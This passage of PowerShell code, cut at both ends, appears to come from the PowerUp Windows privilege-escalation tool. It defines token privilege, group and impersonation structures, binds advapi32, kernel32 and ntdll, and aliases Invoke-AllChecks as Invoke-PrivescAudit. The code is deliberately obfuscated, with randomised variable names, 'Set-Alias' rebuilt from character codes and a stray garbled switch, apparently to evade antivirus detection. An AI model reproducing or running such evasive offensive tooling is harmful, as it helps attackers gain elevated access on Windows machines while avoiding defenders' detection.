    SE_GROUP_ENABLED_BY_DEFAULT     =   '0x00000002'
    SE_GROUP_ENABLED                =   '0x00000004'
    SE_GROUP_OWNER                  =   '0x00000008'
    SE_GROUP_USE_FOR_DENY_ONLY      =   '0x00000010'
    SE_GROUP_INTEGRITY              =   '0x00000020'
    SE_GROUP_RESOURCE               =   '0x20000000'
    SE_GROUP_INTEGRITY_ENABLED      =   '0xC0000000'
} -kTTNmmcQEI

$hJ = psenum $Module PowerUp.LuidAttributes UInt32 @{
    DISABLED                            =   '0x00000000'
    SE_PRIVILEGE_ENABLED_BY_DEFAULT     =   '0x00000001'
    SE_PRIVILEGE_ENABLED                =   '0x00000002'
    SE_PRIVILEGE_REMOVED                =   '0x00000004'
    SE_PRIVILEGE_USED_FOR_ACCESS        =   '0x80000000'
} -kTTNmmcQEI

$CkFo7Y = psenum $Module PowerUp.SecurityEntity UInt32 @{
    SeCreateTokenPrivilege              =   1
    SeAssignPrimaryTokenPrivilege       =   2
    SeLockMemoryPrivilege               =   3
    SeIncreaseQuotaPrivilege            =   4
    SeUnsolicitedInputPrivilege         =   5
    SeMachineAccountPrivilege           =   6
    SeTcbPrivilege                      =   7
    SeSecurityPrivilege                 =   8
    SeTakeOwnershipPrivilege            =   9
    SeLoadDriverPrivilege               =   10
    SeSystemProfilePrivilege            =   11
    SeSystemtimePrivilege               =   12
    SeProfileSingleProcessPrivilege     =   13
    SeIncreaseBasePriorityPrivilege     =   14
    SeCreatePagefilePrivilege           =   15
    SeCreatePermanentPrivilege          =   16
    SeBackupPrivilege                   =   17
    SeRestorePrivilege                  =   18
    SeShutdownPrivilege                 =   19
    SeDebugPrivilege                    =   20
    SeAuditPrivilege                    =   21
    SeSystemEnvironmentPrivilege        =   22
    SeChangeNotifyPrivilege             =   23
    SeRemoteShutdownPrivilege           =   24
    SeUndockPrivilege                   =   25
    SeSyncAgentPrivilege                =   26
    SeEnableDelegationPrivilege         =   27
    SeManageVolumePrivilege             =   28
    SeImpersonatePrivilege              =   29
    SeCreateGlobalPrivilege             =   30
    SeTrustedCredManAccessPrivilege     =   31
    SeRelabelPrivilege                  =   32
    SeIncreaseWorkingSetPrivilege       =   33
    SeTimeZonePrivilege                 =   34
    SeCreateSymbolicLinkPrivilege       =   35
}

$VqR = struct $Module PowerUp.SidAndAttributes @{
    Sid         =   field 0 IntPtr
    Attributes  =   field 1 UInt32
}

$GwDPvfRMY6AV1be = psenum $Module PowerUp.TokenTypeEnum UInt32 @{
    Primary         = 1
    Impersonation   = 2
}

$r5AIfphFtsd9DlQcN = struct $Module PowerUp.TokenType @{
    Type  = field 0 $GwDPvfRMY6AV1be
}

$K0kuO2jX = psenum $Module PowerUp.ImpersonationLevelEnum UInt32 @{
    Anonymous         =   0
    Identification    =   1
    Impersonation     =   2
    Delegation        =   3
}

$muoEMHFXG4wV1nbfdv5ZD = struct $Module PowerUp.ImpersonationLevel @{
    ImpersonationLevel  = field 0 $K0kuO2jX
}

$dPqXG0T6Yn7FzL = struct $Module PowerUp.TokenGroups @{
    GroupCount  = field 0 UInt32
    Groups      = field 1 $VqR.MakeArrayType() -MarshalAs @('ByValArray', 32)
}

$Z5axt3zy9 = struct $Module PowerUp.Luid @{
    LowPart         =   field 0 $CkFo7Y
    HighPart        =   field 1 Int32
}

$1 = struct $Module PowerUp.LuidAndAttributes @{
    Luid         =   field 0 $Z5axt3zy9
    Attributes   =   field 1 UInt32
}

$hVrTDW4flQpm0oOG5RL7 = struct $Module PowerUp.TokenPrivileges @{
    PrivilegeCount  = field 0 UInt32
    Privileges      = field 1 $1.MakeArrayType() -MarshalAs @('ByValArray', 50)
}

$AlXY = $ppPd8KS7Mcd | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
$m9OcQ7t = $AlXY['advapi32']
$NV3dxzM2 = $AlXY['kernel32']
$o4EQcXi9sW1VsyIMXiUCj3    = $AlXY['ntdll']

& ([string]::join('', ( (83,101,116,45,65,108,105,97,115) |%{ ( [char][int] $_)})) | % {$_}) Get-CurrentUserTokenGroupSid Get-ProcessTokenGroup
& ([string]::join('', ( (83,101,116,45,65,108,105,97,115) |%{ ( [char][int] $_)})) | % {$_}) Invoke-AllChecks Invoke-PrivescAudit

